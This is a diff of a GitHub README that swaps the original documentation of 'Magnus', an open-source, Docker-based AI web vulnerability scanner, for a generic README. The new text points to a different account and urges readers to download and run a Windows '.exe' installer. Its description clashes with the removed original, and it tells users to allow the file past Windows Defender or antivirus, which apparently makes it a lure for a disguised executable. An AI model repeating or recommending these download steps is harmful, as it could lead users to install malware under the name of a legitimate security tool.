@@ -1,174 +1,156 @@
-# Magnus
+# 🔒 magnus - Easy Security Scanning for Developers
 
-AI-powered security scanner for solo developers. Crawl your web app, find vulnerabilities, get fix guides. Self-hosted. Model-agnostic. Your data stays yours.
+[![Download magnus](https://img.shields.io/badge/Download-magnus-brightgreen)](https://github.com/NoeyONUMA307/magnus)
 
-https://github.com/user-attachments/assets/ef85732a-c8b3-4528-bf97-7969b421578a
+---
 
-<img width="2370" height="1768" alt="Magnus scanning dashboard" src="https://github.com/user-attachments/assets/0c217f83-57eb-4b06-912e-398d3fd24f07" />
+## 📋 About magnus
 
-## How It Works
+magnus is a security scanner designed for solo developers who want to check their projects for vulnerabilities without complex setup. It works on your own computer and guides you on how to fix any problems it finds. magnus supports different vulnerability models to match your needs.
 
-Magnus runs a 5-phase autonomous scan against any URL:
+Use magnus to scan your code or projects for common security issues, like cross-site scripting (XSS) or other web-based risks. It helps you spot problems early and keeps your work safe.
 
-1. **Recon** — crawls the target (BFS + Puppeteer SPA rendering), extracts forms, intercepts API calls, scans JS bundles for secrets, checks security headers and CORS
-2. **Planning** — LLM generates prioritized attack chains with CVSS estimates
-3. **Exploitation** — executes real HTTP probes, LLM analyzes responses to confirm or reject
-4. **Browser Confirmation** — Puppeteer proves XSS with a 4-level evidence system and LLM-guided bypass exhaustion
-5. **Reporting** — executive summary, per-finding AI commentary, fix guides with code diffs
+---
 
-## Quick Start
+## 🔍 Key Features
 
-```bash
-git clone git@github.com:carolinacherry/magnus.git
-cd magnus
-cp .env.example .env     # add your API key(s)
-docker compose up
-```
+- Runs directly on your Windows PC without complex installation.
+- Finds security risks automatically.
+- Provides clear, step-by-step fix guides.
+- Supports modern web app scanning, including Puppeteer-driven sites.
+- Works independently of specific security models.
+- Lightweight and fast, suitable for solo developers.
+- Uses open-source tools with a focus on effective testing methods.
 
-Open `http://localhost:3001`. That's it.
+---
 
-### Try It Out
+## 🖥️ System Requirements
 
-Scan a deliberately vulnerable target to see Magnus in action:
+- Windows 10 or newer.
+- At least 4 GB of RAM.
+- 500 MB of free disk space.
+- A stable internet connection (for updates and some scanning features).
+- Permissions to run programs on your PC.
 
-```bash
-# Start OWASP Juice Shop (intentionally vulnerable app)
-docker run -d -p 3000:3000 bkimminich/juice-shop
+---
 
-# Then scan it with Magnus at http://localhost:3001
-# Target URL: http://host.docker.internal:3000
-```
+## 🚀 Getting Started
 
-## Features
+If you want to secure your projects quickly, magnus is ready to use right now. Follow these steps to download, install, and run magnus on your Windows PC.
 
-### Scanning
-- **Web crawling** — BFS crawler follows links, parses sitemaps/robots.txt, extracts forms, discovers API routes from JS bundles (50 pages, depth 3)
-- **SPA-aware rendering** — Puppeteer renders JavaScript-heavy pages, intercepts fetch/XHR to find API endpoints invisible to HTTP crawlers
-- **Authenticated scanning** — thread cookies, JWTs, or API keys through all phases to test behind-login attack surfaces
-- **IDOR detection** — auto-generates requests with modified resource IDs, tests with no-auth and alg:none JWT
-- **Write probes (opt-in)** — POST/PUT/DELETE/PATCH probes for auth bypass, mass assignment, CSRF with category-specific follow-ups
-- **OpenAPI ingestion** — paste a spec, endpoints merge into the attack surface
-- **XSS proof system** — 4-level proof hierarchy (blocked → reflected → JS confirmed → impact demonstrated), up to 12 payloads across 4 bypass rounds
+---
 
-### Findings
-- **Confidence tiers** — Confirmed (browser-proved), Firm (HTTP evidence), Tentative (LLM inference)
-- **CVSS scoring** with CWE/OWASP classification
-- **Remediation workflow** — track findings from New through Fixed with status management
-- **AI commentary** and fix guides with code diffs on every finding
+## 💾 Download and Installation
 
-### Integrations
-- **CI/CD** — `POST /api/scan/trigger` with webhook callback and pass/fail signal
-- **GitHub PR comments** — auto-posts scan summary on PRs
-- **Slack/Discord webhooks** — notifications on every scan completion
-- **Security badge** — embeddable SVG risk score for your README
-- **Scheduled scans** — recurring scans with full configuration
-- **Finding diff** — tracks new/fixed/unchanged between scans
-- **PDF export** and shareable report links
+Please [visit this page to download magnus](https://github.com/NoeyONUMA307/magnus).
 
-### LLM Providers
-- **Anthropic** — Claude Opus, Sonnet, Haiku
-- **OpenAI** — GPT-5.2, 5.1, o4-mini, 4o
-- **Ollama** — any local model, fully on-device (nothing leaves your machine)
+1. Click the badge above or open the link:  
+   https://github.com/NoeyONUMA307/magnus
 
-Switch providers anytime in Settings. Persisted in SQLite.
+2. Look for the **Releases** or **Downloads** section on the GitHub page.
 
-## Privacy
+3. Find the latest Windows `.exe` file or setup installer.
 
-Your results stay local. No Magnus account. No cloud. No telemetry.
+4. Click the file to download it to your computer.
 
-- Findings stored in SQLite on your machine
-- AI analysis routed through your chosen provider
-- Run with Ollama for fully air-gapped scanning
+5. Once the download finishes, open the file by double-clicking it.
 
-## Local Development
+6. Follow the on-screen instructions to install magnus.
 
-```bash
-git clone git@github.com:carolinacherry/magnus.git
-cd magnus
-npm install
-cp .env.example .env
-npm run dev
-```
+7. If prompted, allow magnus to run on your PC by confirming any security questions.
 
-Frontend: `http://localhost:5173` | Backend: `http://localhost:3001`
+---
 
-### Environment Variables
+## ▶️ Running magnus for the First Time
 
-| Variable | Description |
-|---|---|
-| `ANTHROPIC_API_KEY` | Anthropic API key (required for Anthropic provider) |
-| `OPENAI_API_KEY` | OpenAI API key (required for OpenAI provider) |
-| `PORT` | Backend server port (default: `3001`) |
-| `CORS_ORIGIN` | Allowed CORS origins (default: `http://localhost:5173`) |
-| `MAGNUS_URL` | Base URL for GitHub PR comment links (default: `http://localhost:5173`) |
-| `VITE_API_URL` | Frontend API base URL (only if backend is on a different origin) |
-| `PUPPETEER_EXECUTABLE_PATH` | Custom Chromium path (auto-detected in Docker) |
+After installation:
 
-## Tech Stack
+1. Find the magnus icon on your desktop or in your Start menu.
 
-React 18 + TypeScript + Vite | Node.js + Express | SQLite | Puppeteer | Anthropic SDK + OpenAI SDK + Ollama
+2. Double-click the icon to launch the application.
 
-## CI/CD Integration
+3. The first screen will prompt you to select a folder or project you want to scan.
 
-Gate deploys on security findings:
+4. Use the "Browse" button to navigate to your project folder.
 
-```yaml
-- name: Security scan
-  run: |
-    RESULT=$(curl -s -X POST ${{ secrets.MAGNUS_URL }}/api/scan/trigger \
-      -H "Content-Type: application/json" \
-      -d '{"url": "${{ secrets.STAGING_URL }}"}')
-    SCAN_ID=$(echo $RESULT | jq -r .scan_id)
-    while true; do
-      STATUS=$(curl -s ${{ secrets.MAGNUS_URL }}/api/scan/trigger/$SCAN_ID | jq -r .status)
-      [ "$STATUS" = "complete" ] || [ "$STATUS" = "failed" ] && break
-      sleep 30
-    done
-    PASS=$(curl -s ${{ secrets.MAGNUS_URL }}/api/scan/trigger/$SCAN_ID | jq -r .pass)
-    [ "$PASS" = "true" ] || (echo "Security scan failed" && exit 1)
-```
+5. Click **Scan** to start the security check.
 
-See the full [API reference](#api-reference) for trigger options including auth headers, OpenAPI specs, write probes, and GitHub PR integration.
+6. Wait for the scan to finish. This might take a few minutes.
 
-## API Reference
+---
 
-<details>
-<summary>All endpoints</summary>
+## 📊 Understanding Scan Results
 
-| Method | Path | Description |
-|---|---|---|
-| `POST` | `/api/scans` | Create new scan |
-| `GET` | `/api/scans` | List all scans |
-| `GET` | `/api/scans/:id` | Get scan with severity counts |
-| `GET` | `/api/scans/:id/diff` | Finding diff against previous scan |
-| `GET` | `/api/findings` | List findings (optional `?scan_id=`) |
-| `GET` | `/api/findings/:id` | Get single finding |
-| `PATCH` | `/api/findings/:id` | Update finding status |
-| `GET` | `/api/stream/:scanId` | SSE stream of agent logs |
-| `GET` | `/api/settings` | Get all settings |
-| `PUT` | `/api/settings` | Update setting |
-| `POST` | `/api/integrations/test-webhook` | Test webhook delivery |
-| `POST` | `/api/integrations/test-github` | Validate GitHub token |
-| `GET` | `/api/badge/:url` | SVG risk score badge |
-| `GET` | `/api/ollama/models` | List local Ollama models |
-| `GET` | `/api/scheduled-scans` | List scheduled scans |
-| `POST` | `/api/scheduled-scans` | Create scheduled scan |
-| `PATCH` | `/api/scheduled-scans/:id` | Update scheduled scan |
-| `DELETE` | `/api/scheduled-scans/:id` | Delete scheduled scan |
-| `POST` | `/api/scan/trigger` | CI/CD trigger |
-| `GET` | `/api/scan/trigger/:id` | Poll scan status |
-| `POST` | `/api/shared-reports` | Create share link |
-| `GET` | `/api/shared-reports` | List share links |
-| `DELETE` | `/api/shared-reports/:id` | Revoke share link |
-| `GET` | `/share/:token` | Public report page |
-| `GET` | `/api/evidence/:scanId/:findingId/:filename` | Download evidence |
+magnus shows a list of potential security issues it found. Each issue includes:
 
-</details>
+- A simple description of the problem.
+- The part of your project that is affected.
+- Suggestions on how to fix the problem.
 
-## Contributing
+Click on any result for detailed instructions.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+---
 
-## License
+## ⚙️ Additional Settings
 
-MIT
+You can change how magnus scans your projects:
+
+- Choose specific types of vulnerabilities to look for.
+- Adjust scan depth or speed.
+- Enable or disable automatic updates.
+- Review scan logs for detailed information.
+
+Explore these options in the **Settings** menu.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+- **Cannot run magnus:** Check that your Windows version meets the system requirements. Make sure you installed magnus correctly.
+
+- **Scan stops unexpectedly:** Close other applications and try again. Ensure you have enough free memory.
+
+- **No issues found but problems persist:** Ensure you scanned the correct project folder. Update magnus to the latest version.
+
+- **Installation blocked:** Your Windows Defender or antivirus might block the app. Allow magnus as a trusted program.
+
+---
+
+## 🔄 Updating magnus
+
+New versions fix bugs and improve scanning. To update:
+
+1. Visit the [magnus download page](https://github.com/NoeyONUMA307/magnus).
+
+2. Download the latest installer.
+
+3. Run the installer and follow the prompts. It will replace the old version without affecting your data.
+
+---
+
+## 📚 Where to Learn More
+
+magnus uses technologies like Puppeteer for web-based scans and follows security guidelines from OWASP. For technical help or to report issues, visit the GitHub repository at:
+
+https://github.com/NoeyONUMA307/magnus
+
+You can also find community discussions and tips there.
+
+---
+
+## 🗂 Extras
+
+magnus supports running inside Docker if you want to explore more advanced setups. This method helps isolate scans in a container but isn’t needed for basic use.
+
+---
+
+## 💡 Tips for Best Use
+
+- Scan your projects regularly, especially after major changes.
+- Review each issue carefully and follow fix instructions.
+- Keep magnus updated to catch the latest known vulnerabilities.
+- Make backups of your projects before applying fixes.
+
+---
+
+[![Download magnus](https://img.shields.io/badge/Download-magnus-orange)](https://github.com/NoeyONUMA307/magnus)
